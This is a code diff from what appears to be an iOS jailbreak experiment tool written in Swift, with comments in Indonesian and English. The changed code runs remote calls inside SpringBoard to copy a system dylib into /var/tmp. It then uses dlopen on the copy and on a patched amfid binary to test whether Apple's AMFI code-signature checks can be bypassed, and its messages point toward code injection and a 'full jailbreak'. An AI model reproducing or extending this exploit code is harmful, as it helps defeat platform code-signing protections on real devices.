@@ -5684,48 +5684,72 @@ struct AMFIExperimentView: View {
         }
         RootExecutor.rcall(sb, "free", fakeLib)
 
-        // ═══ TEST C: Tulis minimal dylib ke /var/tmp + dlopen ═══
-        detail += "\n=== Test C: Write minimal dylib + dlopen ===\n"
+        // ═══ TEST C: Copy REAL system dylib ke /var/tmp + dlopen ═══
+        detail += "\n=== Test C: Copy real dylib + dlopen ===\n"
+        detail += "Copy /usr/lib/libz.1.dylib ke /var/tmp lalu dlopen copy.\n"
+        detail += "Jika gagal = AMFI cek CDHash per-file (bukan hanya format).\n\n"
 
-        let dylibPath = "/var/tmp/.dsp_test.dylib"
-        let dylibPathAddr = remote_alloc_str(sb, dylibPath)
+        let dylibSrc = "/usr/lib/libz.1.dylib"
+        let dylibDst = "/var/tmp/.dsp_libz_copy.dylib"
+        let dylibSrcAddr = remote_alloc_str(sb, dylibSrc)
+        let dylibDstAddr = remote_alloc_str(sb, dylibDst)
 
-        // Tulis Mach-O dylib minimal (header only — enough for dlopen to try)
-        RootExecutor.rcall(sb, "unlink", dylibPathAddr)
-        let fd = RootExecutor.rcall(sb, "open", dylibPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
-        if fd != UInt64(bitPattern: -1) {
-            let hdr = mem + 0x1000
-            // Mach-O header for dylib
-            rc_write32(sb, hdr + 0, 0xFEEDFACF)   // magic
-            rc_write32(sb, hdr + 4, 0x0100000C)   // CPU_TYPE_ARM64
-            rc_write32(sb, hdr + 8, 0x00000002)   // CPU_SUBTYPE_ARM64E
-            rc_write32(sb, hdr + 12, 0x00000006)  // MH_DYLIB
-            rc_write32(sb, hdr + 16, 0)           // ncmds
-            rc_write32(sb, hdr + 20, 0)           // sizeofcmds
-            rc_write32(sb, hdr + 24, 0x00000085)  // flags
-            rc_write32(sb, hdr + 28, 0)           // reserved
-            RootExecutor.rcall(sb, "write", fd, hdr, 32)
-            RootExecutor.rcall(sb, "close", fd)
-            detail += "Wrote minimal dylib to \(dylibPath)\n"
+        RootExecutor.rcall(sb, "unlink", dylibDstAddr)
 
-            // dlopen it
-            let handleC = RootExecutor.rcall(sb, "dlopen", dylibPathAddr, RTLD_LAZY)
-            detail += "dlopen(\(dylibPath)): handle=0x\(String(format: "%llx", handleC))\n"
+        // Copy dylib
+        let srcFdC = RootExecutor.rcall(sb, "open", dylibSrcAddr, UInt64(O_RDONLY), 0)
+        let dstFdC = RootExecutor.rcall(sb, "open", dylibDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+
+        if srcFdC != UInt64(bitPattern: -1) && dstFdC != UInt64(bitPattern: -1) {
+            let cpBuf = mem + 0x1000
+            var cpTotal: UInt64 = 0
+            for _ in 0..<256 {
+                let n = RootExecutor.rcall(sb, "read", srcFdC, cpBuf, 4096)
+                if n == 0 || n > 4096 { break }
+                RootExecutor.rcall(sb, "write", dstFdC, cpBuf, n)
+                cpTotal += n
+            }
+            RootExecutor.rcall(sb, "close", srcFdC)
+            RootExecutor.rcall(sb, "close", dstFdC)
+            detail += "Copied \(cpTotal) bytes (\(dylibSrc) → \(dylibDst))\n"
+
+            // dlopen the COPY
+            let handleC = RootExecutor.rcall(sb, "dlopen", dylibDstAddr, RTLD_NOW)
+            detail += "dlopen(copy): handle=0x\(String(format: "%llx", handleC))\n"
 
             if handleC != 0 {
-                detail += "\n🎉🎉🎉 DLOPEN UNSIGNED DYLIB WORKS! 🎉🎉🎉\n"
-                detail += "SpringBoard loaded our dylib from /var/tmp!\n"
-                detail += "AMFI DOES NOT CHECK dlopen at runtime!\n\n"
-                detail += "→ Tulis dylib dengan constructor → code execution!\n"
-                detail += "→ FULL JAILBREAK ACHIEVED!\n"
+                detail += "\n🎉🎉🎉 DLOPEN COPIED DYLIB WORKS! 🎉🎉🎉\n"
+                detail += "SpringBoard loaded COPIED dylib from /var/tmp!\n"
+                detail += "AMFI does NOT validate CDHash for dlopen!\n\n"
+                detail += "→ Patch dylib copy → inject code → FULL JAILBREAK!\n"
                 RootExecutor.rcall(sb, "dlclose", handleC)
             } else {
-                detail += "❌ dlopen gagal — AMFI juga check dlopen\n"
-                detail += "Atau: dylib header tidak valid (expected untuk minimal header)\n"
+                detail += "❌ dlopen copy gagal — AMFI validate CDHash even for dlopen\n"
+                detail += "Confirmed: AMFI enforce code signature untuk SEMUA code loading.\n"
             }
         } else {
-            detail += "❌ Cannot write dylib to /var/tmp\n"
+            let errC = remote_errno(sb)
+            detail += "❌ open gagal: errno=\(errC)\n"
+            if srcFdC != UInt64(bitPattern: -1) { RootExecutor.rcall(sb, "close", srcFdC) }
+            if dstFdC != UInt64(bitPattern: -1) { RootExecutor.rcall(sb, "close", dstFdC) }
         }
+
+        // Also try dlopen the patched amfid (valid Mach-O, 252KB)
+        detail += "\n--- Test C2: dlopen patched amfid binary ---\n"
+        let patchedAmfid = remote_alloc_str(sb, "/var/tmp/.amfid_patched")
+        let handleC2 = RootExecutor.rcall(sb, "dlopen", patchedAmfid, RTLD_LAZY)
+        detail += "dlopen(.amfid_patched): handle=0x\(String(format: "%llx", handleC2))\n"
+        if handleC2 != 0 {
+            detail += "🎉 Patched amfid loadable via dlopen!\n"
+            RootExecutor.rcall(sb, "dlclose", handleC2)
+        } else {
+            detail += "❌ Also rejected\n"
+        }
+        RootExecutor.rcall(sb, "free", patchedAmfid)
+
+        RootExecutor.rcall(sb, "unlink", dylibDstAddr)
+        RootExecutor.rcall(sb, "free", dylibSrcAddr)
+        RootExecutor.rcall(sb, "free", dylibDstAddr)
 
         // ═══ TEST D: dlopen system dylib via symlink dari /var/tmp ═══
         detail += "\n=== Test D: dlopen system dylib via symlink ===\n"
